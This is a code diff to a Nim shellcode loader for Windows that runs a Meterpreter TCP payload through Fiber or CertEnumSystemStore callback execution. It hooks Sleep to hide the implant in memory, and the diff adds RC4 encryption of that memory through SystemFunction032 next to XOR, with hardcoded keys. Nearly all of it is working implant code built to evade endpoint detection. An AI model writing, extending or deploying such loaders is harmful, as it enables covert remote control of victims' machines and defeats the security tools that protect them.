@@ -4,20 +4,42 @@ import strformat
 import winim\lean
 import nimprotect
 
+##############################
+########### Config ###########
+##############################
 
 # Raw shellcode file to load
 const shellcFile = protectString("x64_meterpreter_tcp")
 # Shellcode execution method
-#   1 = as Fiber
+#   1 = As Fiber
 #   2 = CertEnumSystemStore callback
 const execMethod = 2
 # Implant sleep time
-const sleepTime = 15 * 1000
+const sleepTime = 10 * 1000
+# Encoding method
+#   1 = Simple byte xor
+#   2 = RC4 using SystemFunction032
+const encMethod = 2
+# Encoding / encryption keys
+const xorKey = 0x52
+const rc4Key = [char '5', 'b', '(', 'a', '@', '3', '7', 'k', '~', 'z', 'L', '9', '*', 'K', '#', '-']
+
+##############################
+########### Config ###########
+##############################
 
 # Global vars
 var shellcAddress: LPVOID
 var shellcSize: SIZE_T
 var implantAllocs: seq[(PVOID, SIZE_T)]
+
+# Some RC4 definitions
+proc SystemFunction032*(memoryRegion: pointer, keyPointer: pointer): NTSTATUS  {.discardable, stdcall, dynlib: "Advapi32", importc: "SystemFunction032".}
+type
+    USTRING* = object
+        Length*: DWORD
+        MaximumLength*: DWORD
+        Buffer*: PVOID
 
 
 func toBytes(str: string): seq[byte] {.inline.} =
@@ -72,9 +94,24 @@ proc injectShellcode(shellc: seq[byte], execMethod: int): bool =
         return false
 
 
-proc xorMemory(address: LPVOID, size: SIZE_T, key: byte) =
+proc xorMem(address: LPVOID, size: SIZE_T, key: byte) =
     for i in 0..<int(size):
         cast[PBYTE](address + i)[0] = cast[PBYTE](address + i)[0] xor key
+
+
+proc rc4Mem(address: LPVOID, size: SIZE_T, rc4Key: ptr array[16, char]) =
+    
+    var keyString: USTRING
+    var imgString: USTRING
+
+    keyString.Buffer = cast[PVOID](rc4Key)
+    keyString.Length = 16
+    keyString.MaximumLength = 16
+    imgString.Buffer = address
+    imgString.Length = cast[DWORD](size)
+    imgString.MaximumLength = cast[DWORD](size)
+    
+    SystemFunction032(&imgString, &keyString)
 
 
 proc mySleep(dwMilliseconds: DWORD) {.stdcall, minhook: Sleep.} =
@@ -92,7 +129,10 @@ proc mySleep(dwMilliseconds: DWORD) {.stdcall, minhook: Sleep.} =
         when not defined(release): echo fmt"[i] Encoding 0x{repr page[0]}"
         
         # Encode the shellcode
-        xorMemory(page[0], page[1], 0x1)
+        if encMethod == 1:
+            xorMem(page[0], page[1], xorKey)
+        elif encMethod == 2:
+            rc4Mem(page[0], page[1], unsafeAddr rc4Key)
         
     when not defined(release): echo fmt"[i] Sleeping for {sleepTime/1000} seconds"
 
@@ -104,7 +144,10 @@ proc mySleep(dwMilliseconds: DWORD) {.stdcall, minhook: Sleep.} =
         when not defined(release): echo fmt"[i] Decoding 0x{repr page[0]}"
 
         # Decode the shellcode
-        xorMemory(page[0], page[1], 0x1)
+        if encMethod == 1:
+            xorMem(page[0], page[1], xorKey)
+        elif encMethod == 2:
+            rc4Mem(page[0], page[1], unsafeAddr rc4Key)
 
         when not defined(release): echo fmt"[i] Changing 0x{repr page[0]} -> PAGE_EXECUTE_READWRITE"
 
